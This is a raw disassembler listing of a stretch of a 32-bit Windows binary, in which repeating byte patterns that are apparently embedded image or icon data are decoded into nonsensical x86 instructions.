  403c9f:	ff                   	(bad)
  403ca0:	ff 86 e8 ff ff 86    	incl   -0x79000018(%esi)
  403ca6:	e8 ff ff 86 e8       	call   0xe8c73caa
  403cab:	ff                   	(bad)
  403cac:	ff 86 e8 ff ff 86    	incl   -0x79000018(%esi)
  403cb2:	e8 ff ff 86 e8       	call   0xe8c73cb6
  403cb7:	ff                   	(bad)
  403cb8:	ff 86 e8 ff ff 86    	incl   -0x79000018(%esi)
  403cbe:	e8 ff ff 86 e8       	call   0xe8c73cc2
  403cc3:	ff                   	(bad)
  403cc4:	ff 66 c7             	jmp    *-0x39(%esi)
  403cc7:	ff                   	(bad)
  403cc8:	ff 00                	incl   (%eax)
  403cca:	92                   	xchg   %eax,%edx
  403ccb:	cc                   	int3
  403ccc:	ff 02                	incl   (%edx)
  403cce:	10 16                	adc    %dl,(%esi)
  403cd0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403cd1:	03 03                	add    (%ebx),%eax
  403cd3:	03 43 00             	add    0x0(%ebx),%eax
  403cd6:	00 00                	add    %al,(%eax)
  403cd8:	0a 00                	or     (%eax),%al
	...
  403d0a:	82 b6 48 27 a4 d9 ff 	xorb   $0xff,-0x265bd8b8(%esi)
  403d11:	27                   	daa
  403d12:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403d13:	d9 ff                	fcos
  403d15:	9e                   	sahf
  403d16:	da f2                	(bad)
  403d18:	ff ae ee ff ff 89    	ljmp   *-0x76000012(%esi)
  403d1e:	eb ff                	jmp    0x403d1f
  403d20:	ff 89 eb ff ff 89    	decl   -0x76000015(%ecx)
  403d26:	eb ff                	jmp    0x403d27
  403d28:	ff 89 eb ff ff 89    	decl   -0x76000015(%ecx)
  403d2e:	eb ff                	jmp    0x403d2f
  403d30:	ff 89 eb ff ff 89    	decl   -0x76000015(%ecx)
  403d36:	eb ff                	jmp    0x403d37
  403d38:	ff 89 eb ff ff 89    	decl   -0x76000015(%ecx)
  403d3e:	eb ff                	jmp    0x403d3f
  403d40:	ff 89 eb ff ff 89    	decl   -0x76000015(%ecx)
  403d46:	eb ff                	jmp    0x403d47
  403d48:	ff 89 eb ff ff 89    	decl   -0x76000015(%ecx)
  403d4e:	eb ff                	jmp    0x403d4f
  403d50:	ff 89 eb ff ff 89    	decl   -0x76000015(%ecx)
  403d56:	eb ff                	jmp    0x403d57
  403d58:	ff 89 eb ff ff 89    	decl   -0x76000015(%ecx)
  403d5e:	eb ff                	jmp    0x403d5f
  403d60:	ff 89 eb ff ff 89    	decl   -0x76000015(%ecx)
  403d66:	eb ff                	jmp    0x403d67
  403d68:	ff 89 eb ff ff 89    	decl   -0x76000015(%ecx)
  403d6e:	eb ff                	jmp    0x403d6f
  403d70:	ff 89 eb ff ff 89    	decl   -0x76000015(%ecx)
  403d76:	eb ff                	jmp    0x403d77
  403d78:	ff 89 eb ff ff 89    	decl   -0x76000015(%ecx)
  403d7e:	eb ff                	jmp    0x403d7f
  403d80:	ff 89 eb ff ff 66    	decl   0x66ffffeb(%ecx)
  403d86:	c7                   	(bad)
  403d87:	ff                   	(bad)
  403d88:	ff 2a                	ljmp   *(%edx)
  403d8a:	ad                   	lods   %ds:(%esi),%eax
  403d8b:	d9 ff                	fcos
  403d8d:	01 34 47             	add    %esi,(%edi,%eax,2)
  403d90:	bc 02 02 02 52       	mov    $0x52020202,%esp
  403d95:	00 00                	add    %al,(%eax)
  403d97:	00 10                	add    %dl,(%eax)
	...
  403dc9:	00 82 b6 48 28 a5    	add    %al,-0x5ad7b74a(%edx)
  403dcf:	d9 ff                	fcos
  403dd1:	28 a5 d9 ff 77 c8    	sub    %ah,-0x37880027(%ebp)
  403dd7:	e9 ff b0 f0 ff       	jmp    0x30eedb
  403ddc:	ff 8c ee ff ff 8c ee 	decl   -0x11730001(%esi,%ebp,8)
  403de3:	ff                   	(bad)
  403de4:	ff 8c ee ff ff 8c ee 	decl   -0x11730001(%esi,%ebp,8)
  403deb:	ff                   	(bad)
  403dec:	ff 8c ee ff ff 8c ee 	decl   -0x11730001(%esi,%ebp,8)
  403df3:	ff                   	(bad)
  403df4:	ff 8c ee ff ff 8c ee 	decl   -0x11730001(%esi,%ebp,8)
  403dfb:	ff                   	(bad)
  403dfc:	ff 8c ee ff ff 8c ee 	decl   -0x11730001(%esi,%ebp,8)
  403e03:	ff                   	(bad)
  403e04:	ff 8c ee ff ff 8c ee 	decl   -0x11730001(%esi,%ebp,8)
  403e0b:	ff                   	(bad)
  403e0c:	ff 8c ee ff ff 8c ee 	decl   -0x11730001(%esi,%ebp,8)
  403e13:	ff                   	(bad)
  403e14:	ff 8c ee ff ff 8c ee 	decl   -0x11730001(%esi,%ebp,8)
  403e1b:	ff                   	(bad)
  403e1c:	ff 8c ee ff ff 8c ee 	decl   -0x11730001(%esi,%ebp,8)
  403e23:	ff                   	(bad)
  403e24:	ff 8c ee ff ff 8c ee 	decl   -0x11730001(%esi,%ebp,8)
  403e2b:	ff                   	(bad)
  403e2c:	ff 8c ee ff ff 8c ee 	decl   -0x11730001(%esi,%ebp,8)
  403e33:	ff                   	(bad)
  403e34:	ff 8c ee ff ff 8c ee 	decl   -0x11730001(%esi,%ebp,8)
  403e3b:	ff                   	(bad)
  403e3c:	ff 8c ee ff ff 8c ee 	decl   -0x11730001(%esi,%ebp,8)
  403e43:	ff                   	(bad)
  403e44:	ff 66 c7             	jmp    *-0x39(%esi)
  403e47:	ff                   	(bad)
  403e48:	ff 2c ad d9 ff 01 47 	ljmp   *0x4701ffd9(,%ebp,4)
  403e4f:	62 ca 02             	(bad) {%k2}
  403e52:	02 02                	add    (%edx),%al
  403e54:	60                   	pusha
  403e55:	00 00                	add    %al,(%eax)
  403e57:	00 15 00 00 00 01    	add    %dl,0x1000000
	...
  403e89:	00 80 b3 49 33 aa    	add    %al,-0x55ccb64d(%eax)
  403e8f:	dc ff                	fdivr  %st,%st(7)
  403e91:	33 aa dc ff 6c c3    	xor    -0x3c930024(%edx),%ebp
  403e97:	e6 ff                	out    %al,$0xff
  403e99:	b3 f2                	mov    $0xf2,%bl
  403e9b:	ff                   	(bad)
  403e9c:	ff 8f f1 ff ff 8f    	decl   -0x7000000f(%edi)
  403ea2:	f1                   	int1
  403ea3:	ff                   	(bad)
  403ea4:	ff 8f f1 ff ff 8f    	decl   -0x7000000f(%edi)
  403eaa:	f1                   	int1
  403eab:	ff                   	(bad)
  403eac:	ff 8f f1 ff ff 8f    	decl   -0x7000000f(%edi)
  403eb2:	f1                   	int1
  403eb3:	ff                   	(bad)
  403eb4:	ff 8f f1 ff ff 8f    	decl   -0x7000000f(%edi)
  403eba:	f1                   	int1
  403ebb:	ff                   	(bad)
  403ebc:	ff 8f f1 ff ff 8f    	decl   -0x7000000f(%edi)
  403ec2:	f1                   	int1
  403ec3:	ff                   	(bad)
  403ec4:	ff 8f f1 ff ff 8f    	decl   -0x7000000f(%edi)
  403eca:	f1                   	int1
  403ecb:	ff                   	(bad)
  403ecc:	ff 8f f1 ff ff 8f    	decl   -0x7000000f(%edi)
  403ed2:	f1                   	int1
  403ed3:	ff                   	(bad)
  403ed4:	ff 8f f1 ff ff 8f    	decl   -0x7000000f(%edi)
  403eda:	f1                   	int1
  403edb:	ff                   	(bad)
  403edc:	ff 8f f1 ff ff 8f    	decl   -0x7000000f(%edi)
  403ee2:	f1                   	int1
  403ee3:	ff                   	(bad)
  403ee4:	ff 8f f1 ff ff 8f    	decl   -0x7000000f(%edi)
  403eea:	f1                   	int1
  403eeb:	ff                   	(bad)
  403eec:	ff 8f f1 ff ff 8f    	decl   -0x7000000f(%edi)
  403ef2:	f1                   	int1
  403ef3:	ff                   	(bad)
  403ef4:	ff 8f f1 ff ff 8f    	decl   -0x7000000f(%edi)
  403efa:	f1                   	int1
  403efb:	ff                   	(bad)
  403efc:	ff 8f f1 ff ff 8f    	decl   -0x7000000f(%edi)
  403f02:	f1                   	int1
  403f03:	ff                   	(bad)
  403f04:	ff 66 c7             	jmp    *-0x39(%esi)
  403f07:	ff                   	(bad)
  403f08:	ff 5a c7             	lcall  *-0x39(%edx)
  403f0b:	e6 ff                	out    %al,$0xff
  403f0d:	01 58 7a             	add    %ebx,0x7a(%eax)
  403f10:	d7                   	xlat   %ds:(%ebx)
  403f11:	02 02                	add    (%edx),%al
  403f13:	02 6d 00             	add    0x0(%ebp),%ch
  403f16:	00 00                	add    %al,(%eax)
  403f18:	1a 00                	sbb    (%eax),%al
  403f1a:	00 00                	add    %al,(%eax)
  403f1c:	01 00                	add    %eax,(%eax)
	...
  403f4a:	7d ae                	jge    0x403efa
  403f4c:	4b                   	dec    %ebx
  403f4d:	55                   	push   %ebp
  403f4e:	b9 e6 ff 55 b9       	mov    $0xb955ffe6,%ecx
  403f53:	e6 ff                	out    %al,$0xff
  403f55:	6d                   	insl   (%dx),%es:(%edi)
  403f56:	c3                   	ret
  403f57:	e6 ff                	out    %al,$0xff
  403f59:	b6 f4                	mov    $0xf4,%dh
  403f5b:	ff                   	(bad)
  403f5c:	ff 92 f4 ff ff 92    	call   *-0x6d00000c(%edx)
  403f62:	f4                   	hlt
  403f63:	ff                   	(bad)
  403f64:	ff 92 f4 ff ff 92    	call   *-0x6d00000c(%edx)
  403f6a:	f4                   	hlt
  403f6b:	ff                   	(bad)
  403f6c:	ff 92 f4 ff ff 92    	call   *-0x6d00000c(%edx)
  403f72:	f4                   	hlt
  403f73:	ff                   	(bad)
  403f74:	ff 92 f4 ff ff 92    	call   *-0x6d00000c(%edx)
  403f7a:	f4                   	hlt
  403f7b:	ff                   	(bad)
  403f7c:	ff 92 f4 ff ff 92    	call   *-0x6d00000c(%edx)
  403f82:	f4                   	hlt
  403f83:	ff                   	(bad)
  403f84:	ff 92 f4 ff ff 92    	call   *-0x6d00000c(%edx)
  403f8a:	f4                   	hlt
  403f8b:	ff                   	(bad)
  403f8c:	ff 92 f4 ff ff 92    	call   *-0x6d00000c(%edx)
  403f92:	f4                   	hlt
  403f93:	ff                   	(bad)
  403f94:	ff 92 f4 ff ff 92    	call   *-0x6d00000c(%edx)
  403f9a:	f4                   	hlt
  403f9b:	ff                   	(bad)
  403f9c:	ff 92 f4 ff ff 92    	call   *-0x6d00000c(%edx)
  403fa2:	f4                   	hlt
  403fa3:	ff                   	(bad)
  403fa4:	ff 92 f4 ff ff 92    	call   *-0x6d00000c(%edx)
  403faa:	f4                   	hlt
  403fab:	ff                   	(bad)
  403fac:	ff 92 f4 ff ff 92    	call   *-0x6d00000c(%edx)
  403fb2:	f4                   	hlt
  403fb3:	ff                   	(bad)
  403fb4:	ff 92 f4 ff ff 92    	call   *-0x6d00000c(%edx)
  403fba:	f4                   	hlt
  403fbb:	ff                   	(bad)
  403fbc:	ff 92 f4 ff ff 92    	call   *-0x6d00000c(%edx)
  403fc2:	f4                   	hlt
  403fc3:	ff                   	(bad)
  403fc4:	ff 66 c7             	jmp    *-0x39(%esi)
  403fc7:	ff                   	(bad)
  403fc8:	ff 68 ce             	ljmp   *-0x32(%eax)
  403fcb:	e9 ff 01 67 90       	jmp    0x90a741cf
  403fd0:	e3 02                	jecxz  0x403fd4
  403fd2:	02 02                	add    (%edx),%al
  403fd4:	7a 00                	jp     0x403fd6
  403fd6:	00 00                	add    %al,(%eax)
  403fd8:	1f                   	pop    %ds
  403fd9:	00 00                	add    %al,(%eax)
  403fdb:	00 01                	add    %al,(%ecx)
	...
  404005:	00 00                	add    %al,(%eax)
  404007:	00 01                	add    %al,(%ecx)
  404009:	00 7d af             	add    %bh,-0x51(%ebp)
  40400c:	5d                   	pop    %ebp
  40400d:	57                   	push   %edi
  40400e:	ba e6 ff 57 ba       	mov    $0xba57ffe6,%edx
  404013:	e6 ff                	out    %al,$0xff
  404015:	6e                   	outsb  %ds:(%esi),(%dx)
  404016:	c3                   	ret
  404017:	e6 ff                	out    %al,$0xff
  404019:	ca f5 ff             	lret   $0xfff5
  40401c:	ff 95 f7 ff ff 95    	call   *-0x6a000009(%ebp)
  404022:	f7 ff                	idiv   %edi
  404024:	ff 95 f7 ff ff 95    	call   *-0x6a000009(%ebp)
  40402a:	f7 ff                	idiv   %edi
  40402c:	ff 95 f7 ff ff 95    	call   *-0x6a000009(%ebp)
  404032:	f7 ff                	idiv   %edi
  404034:	ff 95 f7 ff ff 95    	call   *-0x6a000009(%ebp)
  40403a:	f7 ff                	idiv   %edi
  40403c:	ff 95 f7 ff ff 95    	call   *-0x6a000009(%ebp)
  404042:	f7 ff                	idiv   %edi
  404044:	ff 95 f7 ff ff 95    	call   *-0x6a000009(%ebp)
  40404a:	f7 ff                	idiv   %edi
  40404c:	ff 95 f7 ff ff 95    	call   *-0x6a000009(%ebp)
  404052:	f7 ff                	idiv   %edi
  404054:	ff 95 f7 ff ff 95    	call   *-0x6a000009(%ebp)
  40405a:	f7 ff                	idiv   %edi
  40405c:	ff 95 f7 ff ff 95    	call   *-0x6a000009(%ebp)
  404062:	f7 ff                	idiv   %edi
  404064:	ff 95 f7 ff ff 95    	call   *-0x6a000009(%ebp)
  40406a:	f7 ff                	idiv   %edi
  40406c:	ff 95 f7 ff ff 95    	call   *-0x6a000009(%ebp)
  404072:	f7 ff                	idiv   %edi
  404074:	ff 95 f7 ff ff 95    	call   *-0x6a000009(%ebp)
  40407a:	f7 ff                	idiv   %edi
  40407c:	ff 95 f7 ff ff 95    	call   *-0x6a000009(%ebp)
  404082:	f7 ff                	idiv   %edi
  404084:	ff 66 c7             	jmp    *-0x39(%esi)
  404087:	ff                   	(bad)
  404088:	ff 8f e3 f2 ff 00    	decl   0xfff2e3(%edi)
  40408e:	76 a5                	jbe    0x404035
  404090:	ed                   	in     (%dx),%eax
  404091:	03 03                	add    (%ebx),%eax
  404093:	03 88 00 00 00 25    	add    0x25000000(%eax),%ecx
  404099:	00 00                	add    %al,(%eax)
  40409b:	00 01                	add    %al,(%ecx)
	...
  4040c5:	00 00                	add    %al,(%eax)
  4040c7:	00 01                	add    %al,(%ecx)
  4040c9:	00 88 be 8a 59 ba    	add    %cl,-0x45a67542(%eax)
  4040cf:	e6 ff                	out    %al,$0xff
  4040d1:	59                   	pop    %ecx
  4040d2:	ba e6 ff 46 b1       	mov    $0xb146ffe6,%edx
  4040d7:	dc ff                	fdivr  %st,%st(7)
  4040d9:	cd f6                	int    $0xf6
  4040db:	ff                   	(bad)
  4040dc:	ff 98 fb ff ff 98    	lcall  *-0x67000005(%eax)
  4040e2:	fb                   	sti
  4040e3:	ff                   	(bad)
  4040e4:	ff 98 fb ff ff 98    	lcall  *-0x67000005(%eax)
  4040ea:	fb                   	sti
  4040eb:	ff                   	(bad)
  4040ec:	ff 98 fb ff ff 98    	lcall  *-0x67000005(%eax)
  4040f2:	fb                   	sti
  4040f3:	ff                   	(bad)
  4040f4:	ff 98 fb ff ff 98    	lcall  *-0x67000005(%eax)
  4040fa:	fb                   	sti
  4040fb:	ff                   	(bad)
  4040fc:	ff 98 fb ff ff 98    	lcall  *-0x67000005(%eax)
  404102:	fb                   	sti
  404103:	ff                   	(bad)
  404104:	ff 98 fb ff ff 98    	lcall  *-0x67000005(%eax)
  40410a:	fb                   	sti
  40410b:	ff                   	(bad)
  40410c:	ff 98 fb ff ff 98    	lcall  *-0x67000005(%eax)
  404112:	fb                   	sti
  404113:	ff                   	(bad)
  404114:	ff 98 fb ff ff 98    	lcall  *-0x67000005(%eax)
  40411a:	fb                   	sti
  40411b:	ff                   	(bad)
  40411c:	ff 98 fb ff ff 98    	lcall  *-0x67000005(%eax)
  404122:	fb                   	sti
  404123:	ff                   	(bad)
  404124:	ff 98 fb ff ff 98    	lcall  *-0x67000005(%eax)
  40412a:	fb                   	sti
  40412b:	ff                   	(bad)
  40412c:	ff 98 fb ff ff 98    	lcall  *-0x67000005(%eax)
  404132:	fb                   	sti
  404133:	ff                   	(bad)
  404134:	ff 98 fb ff ff 98    	lcall  *-0x67000005(%eax)
  40413a:	fb                   	sti
  40413b:	ff                   	(bad)
  40413c:	ff 98 fb ff ff 98    	lcall  *-0x67000005(%eax)
  404142:	fb                   	sti
  404143:	ff                   	(bad)
  404144:	ff 66 c7             	jmp    *-0x39(%esi)
  404147:	ff                   	(bad)
  404148:	ff 9f e9 f5 ff 00    	lcall  *0xfff5e9(%edi)
  40414e:	84 b8 f7 03 03 03    	test   %bh,0x30303f7(%eax)
  404154:	94                   	xchg   %eax,%esp
  404155:	00 00                	add    %al,(%eax)
  404157:	00 2b                	add    %ch,(%ebx)
  404159:	00 00                	add    %al,(%eax)
  40415b:	00 02                	add    %al,(%edx)
	...
  404185:	00 00                	add    %al,(%eax)
  404187:	00 01                	add    %al,(%ecx)
  404189:	00 88 be 8a 5c bb    	add    %cl,-0x44a37542(%eax)
  40418f:	e6 ff                	out    %al,$0xff
  404191:	67 c1 e9 ff          	addr16 shr $0xff,%ecx
  404195:	39 ab d9 ff d0 f6    	cmp    %ebp,-0x92f0027(%ebx)
  40419b:	ff                   	(bad)
  40419c:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  4041a2:	fc                   	cld
  4041a3:	ff                   	(bad)
  4041a4:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  4041aa:	fc                   	cld
  4041ab:	ff                   	(bad)
  4041ac:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  4041b2:	fc                   	cld
  4041b3:	ff                   	(bad)
  4041b4:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  4041ba:	fc                   	cld
  4041bb:	ff                   	(bad)
  4041bc:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  4041c2:	fc                   	cld
  4041c3:	ff                   	(bad)
  4041c4:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  4041ca:	fc                   	cld
  4041cb:	ff                   	(bad)
  4041cc:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  4041d2:	fc                   	cld
  4041d3:	ff                   	(bad)
  4041d4:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  4041da:	fc                   	cld
  4041db:	ff                   	(bad)
  4041dc:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  4041e2:	fc                   	cld
  4041e3:	ff                   	(bad)
  4041e4:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  4041ea:	fc                   	cld
  4041eb:	ff                   	(bad)
  4041ec:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  4041f2:	fc                   	cld
  4041f3:	ff                   	(bad)
  4041f4:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  4041fa:	fc                   	cld
  4041fb:	ff                   	(bad)
  4041fc:	ff 99 fc ff ff 99    	lcall  *-0x66000004(%ecx)
  404202:	fc                   	cld
  404203:	ff                   	(bad)
  404204:	ff 66 c7             	jmp    *-0x39(%esi)
  404207:	ff                   	(bad)
  404208:	ff c8                	dec    %eax
  40420a:	fd                   	std
  40420b:	ff                   	(bad)
  40420c:	ff 00                	incl   (%eax)
  40420e:	92                   	xchg   %eax,%edx
  40420f:	cc                   	int3
  404210:	ff 02                	incl   (%edx)
  404212:	02 02                	add    (%edx),%al
  404214:	9a 00 00 00 37 00 00 	lcall  $0x0,$0x37000000
  40421b:	00 06                	add    %al,(%esi)
	...
  404245:	00 00                	add    %al,(%eax)
  404247:	00 01                	add    %al,(%ecx)
  404249:	00 87 bc 8b 81 cc    	add    %al,-0x337e7444(%edi)
  40424f:	ef                   	out    %eax,(%dx)
  404250:	ff                   	(bad)
  404251:	7f ce                	jg     0x404221
  404253:	f2 ff                	repnz (bad)
  404255:	39 ac d9 ff d4 f9 ff 	cmp    %ebp,-0x62b01(%ecx,%ebx,8)
  40425c:	ff a2 fc ff ff a2    	jmp    *-0x5d000004(%edx)
  404262:	fc                   	cld
  404263:	ff                   	(bad)
  404264:	ff a2 fc ff ff a2    	jmp    *-0x5d000004(%edx)
  40426a:	fc                   	cld
  40426b:	ff                   	(bad)
  40426c:	ff a2 fc ff ff a2    	jmp    *-0x5d000004(%edx)
  404272:	fc                   	cld
  404273:	ff                   	(bad)
  404274:	ff a2 fc ff ff a2    	jmp    *-0x5d000004(%edx)
  40427a:	fc                   	cld
  40427b:	ff                   	(bad)
  40427c:	ff a2 fc ff ff a2    	jmp    *-0x5d000004(%edx)
  404282:	fc                   	cld
  404283:	ff                   	(bad)
  404284:	ff a2 fc ff ff a2    	jmp    *-0x5d000004(%edx)
  40428a:	fc                   	cld
  40428b:	ff                   	(bad)
  40428c:	ff a2 fc ff ff a2    	jmp    *-0x5d000004(%edx)
  404292:	fc                   	cld
  404293:	ff                   	(bad)
  404294:	ff a2 fc ff ff a2    	jmp    *-0x5d000004(%edx)
  40429a:	fc                   	cld
  40429b:	ff                   	(bad)
  40429c:	ff a2 fc ff ff a2    	jmp    *-0x5d000004(%edx)
  4042a2:	fc                   	cld
  4042a3:	ff                   	(bad)
  4042a4:	ff a2 fc ff ff a2    	jmp    *-0x5d000004(%edx)
  4042aa:	fc                   	cld
  4042ab:	ff                   	(bad)
  4042ac:	ff a2 fc ff ff a2    	jmp    *-0x5d000004(%edx)
  4042b2:	fc                   	cld
  4042b3:	ff                   	(bad)
  4042b4:	ff a2 fc ff ff a2    	jmp    *-0x5d000004(%edx)
  4042ba:	fc                   	cld
  4042bb:	ff                   	(bad)
  4042bc:	ff a2 fc ff ff a2    	jmp    *-0x5d000004(%edx)
  4042c2:	fc                   	cld
  4042c3:	ff                   	(bad)
  4042c4:	ff 66 c7             	jmp    *-0x39(%esi)
  4042c7:	ff                   	(bad)
  4042c8:	ff cd                	dec    %ebp
  4042ca:	fd                   	std
  4042cb:	ff                   	(bad)
  4042cc:	ff 0d 99 cf ff 02    	decl   0x2ffcf99
  4042d2:	1d 27 ac 03 03       	sbb    $0x303ac27,%eax
  4042d7:	03 46 00             	add    0x0(%esi),%eax
  4042da:	00 00                	add    %al,(%eax)
  4042dc:	0c 00                	or     $0x0,%al
	...
  404306:	00 00                	add    %al,(%eax)
  404308:	01 00                	add    %eax,(%eax)
  40430a:	84 b8 8e 91 d3 f2    	test   %bh,-0xd2c6e72(%eax)
  404310:	ff                   	(bad)
  404311:	7e ce                	jle    0x4042e1
  404313:	f2 ff                	repnz (bad)
  404315:	3a ac d9 ff e7 f7 ff 	cmp    -0x81801(%ecx,%ebx,8),%ch
  40431c:	ff ac fc ff ff ac fc 	ljmp   *-0x3530001(%esp,%edi,8)
  404323:	ff                   	(bad)
  404324:	ff ac fc ff ff ac fc 	ljmp   *-0x3530001(%esp,%edi,8)
  40432b:	ff                   	(bad)
  40432c:	ff ac fc ff ff ac fc 	ljmp   *-0x3530001(%esp,%edi,8)
  404333:	ff                   	(bad)
  404334:	ff ac fc ff ff ac fc 	ljmp   *-0x3530001(%esp,%edi,8)
  40433b:	ff                   	(bad)
  40433c:	ff ac fc ff ff ac fc 	ljmp   *-0x3530001(%esp,%edi,8)
  404343:	ff                   	(bad)
  404344:	ff ac fc ff ff ac fc 	ljmp   *-0x3530001(%esp,%edi,8)
  40434b:	ff                   	(bad)
  40434c:	ff ac fc ff ff ac fc 	ljmp   *-0x3530001(%esp,%edi,8)
  404353:	ff                   	(bad)
  404354:	ff ac fc ff ff ac fc 	ljmp   *-0x3530001(%esp,%edi,8)
  40435b:	ff                   	(bad)
  40435c:	ff ac fc ff ff ac fc 	ljmp   *-0x3530001(%esp,%edi,8)
  404363:	ff                   	(bad)
  404364:	ff ac fc ff ff ac fc 	ljmp   *-0x3530001(%esp,%edi,8)
  40436b:	ff                   	(bad)
  40436c:	ff ac fc ff ff ac fc 	ljmp   *-0x3530001(%esp,%edi,8)
  404373:	ff                   	(bad)
  404374:	ff ac fc ff ff ac fc 	ljmp   *-0x3530001(%esp,%edi,8)
  40437b:	ff                   	(bad)
  40437c:	ff ac fc ff ff ac fc 	ljmp   *-0x3530001(%esp,%edi,8)
  404383:	ff                   	(bad)
  404384:	ff 66 c7             	jmp    *-0x39(%esi)
  404387:	ff                   	(bad)
  404388:	ff d4                	call   *%esp
  40438a:	fe                   	(bad)
  40438b:	ff                   	(bad)
  40438c:	ff 35 ae d9 ff 01    	push   0x1ffd9ae
  404392:	34 47                	xor    $0x47,%al
  404394:	bc 02 02 02 56       	mov    $0x56020202,%esp
  404399:	00 00                	add    %al,(%eax)
  40439b:	00 11                	add    %dl,(%ecx)
	...
  4043c5:	00 00                	add    %al,(%eax)
  4043c7:	00 01                	add    %al,(%ecx)
  4043c9:	00 8b c1 b9 95 d4    	add    %cl,-0x2b6a463f(%ebx)
  4043cf:	f2 ff 82 d1 f2 ff 0f 	repnz incl 0xffff2d1(%edx)
  4043d6:	99                   	cltd
  4043d7:	cf                   	iret
  4043d8:	ff                   	ljmp   (bad)
  4043d9:	e9 f8 ff ff cc       	jmp    0xcd4043d6
  4043de:	fa                   	cli
  4043df:	ff                   	(bad)
  4043e0:	ff                   	(bad)
  4043e1:	bc fc ff ff b5       	mov    $0xb5fffffc,%esp
  4043e6:	fd                   	std
  4043e7:	ff                   	(bad)
  4043e8:	ff b5 fd ff ff b5    	push   -0x4a000003(%ebp)
  4043ee:	fd                   	std
  4043ef:	ff                   	(bad)
  4043f0:	ff b5 fd ff ff b5    	push   -0x4a000003(%ebp)
  4043f6:	fd                   	std
  4043f7:	ff                   	(bad)
  4043f8:	ff b5 fd ff ff b5    	push   -0x4a000003(%ebp)
  4043fe:	fd                   	std
  4043ff:	ff                   	(bad)
  404400:	ff b5 fd ff ff b5    	push   -0x4a000003(%ebp)
  404406:	fd                   	std
  404407:	ff                   	(bad)
  404408:	ff b5 fd ff ff b5    	push   -0x4a000003(%ebp)
  40440e:	fd                   	std
  40440f:	ff                   	(bad)
  404410:	ff b5 fd ff ff b5    	push   -0x4a000003(%ebp)
  404416:	fd                   	std
  404417:	ff                   	(bad)
  404418:	ff b5 fd ff ff b5    	push   -0x4a000003(%ebp)
  40441e:	fd                   	std
  40441f:	ff                   	(bad)
  404420:	ff b5 fd ff ff b5    	push   -0x4a000003(%ebp)
  404426:	fd                   	std
  404427:	ff                   	(bad)
  404428:	ff b5 fd ff ff b5    	push   -0x4a000003(%ebp)
  40442e:	fd                   	std
  40442f:	ff                   	(bad)
  404430:	ff b5 fd ff ff b5    	push   -0x4a000003(%ebp)
  404436:	fd                   	std
  404437:	ff                   	(bad)
  404438:	ff b5 fd ff ff b5    	push   -0x4a000003(%ebp)
  40443e:	fd                   	std
  40443f:	ff                   	(bad)
  404440:	ff b5 fd ff ff 66    	push   0x66fffffd(%ebp)
  404446:	c7                   	(bad)
  404447:	ff                   	(bad)
  404448:	ff                   	lcall  (bad)
  404449:	d9 fe                	fsin
  40444b:	ff                   	(bad)
  40444c:	ff 52 ba             	call   *-0x46(%edx)
  40444f:	df ff                	(bad)
  404451:	01 4f 6f             	add    %ecx,0x6f(%edi)
  404454:	d0 02                	rolb   $1,(%edx)
  404456:	02 02                	add    (%edx),%al
  404458:	63 00                	arpl   %eax,(%eax)
  40445a:	00 00                	add    %al,(%eax)
  40445c:	16                   	push   %ss
  40445d:	00 00                	add    %al,(%eax)
  40445f:	00 01                	add    %al,(%ecx)
	...
  404485:	00 00                	add    %al,(%eax)
  404487:	00 01                	add    %al,(%ecx)
  404489:	00 8c c4 c7 98 d5 f2 	add    %cl,-0xd2a6739(%esp,%eax,8)
  404490:	ff a5 e7 ff ff 08    	jmp    *0x8ffffe7(%ebp)
  404496:	97                   	xchg   %eax,%edi
  404497:	cf                   	iret
  404498:	ff 59 b9             	lcall  *-0x47(%ecx)
  40449b:	df ff                	(bad)
  40449d:	cf                   	iret
  40449e:	ec                   	in     (%dx),%al
  40449f:	f9                   	stc
  4044a0:	ff                   	ljmp   (bad)
  4044a1:	ec                   	in     (%dx),%al
  4044a2:	f8                   	clc
  4044a3:	ff                   	(bad)
  4044a4:	ff                   	ljmp   (bad)
  4044a5:	ec                   	in     (%dx),%al
  4044a6:	f8                   	clc
  4044a7:	ff                   	(bad)
  4044a8:	ff e1                	jmp    *%ecx
  4044aa:	fa                   	cli
  4044ab:	ff                   	(bad)
  4044ac:	ff                   	lcall  (bad)
  4044ad:	de fa                	fdivrp %st,%st(2)
  4044af:	ff                   	(bad)
  4044b0:	ff d5                	call   *%ebp
  4044b2:	fb                   	sti
  4044b3:	ff                   	(bad)
  4044b4:	ff cf                	dec    %edi
  4044b6:	fb                   	sti
  4044b7:	ff                   	(bad)
  4044b8:	ff ca                	dec    %edx
  4044ba:	fc                   	cld
  4044bb:	ff                   	(bad)
  4044bc:	ff c1                	inc    %ecx
  4044be:	fd                   	std
  4044bf:	ff                   	(bad)
  4044c0:	ff                   	(bad)
  4044c1:	be fd ff ff be       	mov    $0xbefffffd,%esi
  4044c6:	fd                   	std
  4044c7:	ff                   	(bad)
  4044c8:	ff                   	(bad)
  4044c9:	be fd ff ff be       	mov    $0xbefffffd,%esi
  4044ce:	fd                   	std
  4044cf:	ff                   	(bad)
  4044d0:	ff                   	(bad)
  4044d1:	be fd ff ff be       	mov    $0xbefffffd,%esi
  4044d6:	fd                   	std
  4044d7:	ff                   	(bad)
  4044d8:	ff                   	(bad)
  4044d9:	be fd ff ff be       	mov    $0xbefffffd,%esi
  4044de:	fd                   	std
  4044df:	ff                   	(bad)
  4044e0:	ff                   	(bad)
  4044e1:	be fd ff ff be       	mov    $0xbefffffd,%esi
  4044e6:	fd                   	std
  4044e7:	ff                   	(bad)
  4044e8:	ff                   	(bad)
  4044e9:	be fd ff ff be       	mov    $0xbefffffd,%esi
  4044ee:	fd                   	std
  4044ef:	ff                   	(bad)
  4044f0:	ff                   	(bad)
  4044f1:	be fd ff ff be       	mov    $0xbefffffd,%esi
  4044f6:	fd                   	std
